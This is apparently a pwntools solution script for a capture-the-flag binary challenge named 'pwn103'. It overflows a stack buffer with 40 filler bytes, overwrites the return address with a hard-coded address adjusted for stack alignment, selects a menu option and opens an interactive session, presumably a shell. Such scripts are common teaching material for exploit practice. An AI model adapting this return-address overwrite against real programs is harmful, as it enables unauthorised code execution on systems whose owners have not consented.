from pwn import *


pro = process("pwn103.pwn103")

payload = b"A"*40
payload += p64(0x0000000000401554+1) # https://www.reddit.com/r/ExploitDev/comments/i5beqt/error_got_eof_while_reading_in_interactive_in/
# explanation: because you skipped the call instruction that would normally lead into a function, your stack is misaligned by 1 quadword.

pro.sendlineafter(b": ", b"3") # choose channel

pro.sendlineafter(b": ", payload) # send payload

pro.recv()
#pro.sendline(b"id")
#print(pro.recvline())
pro.interactive()
pro.close()
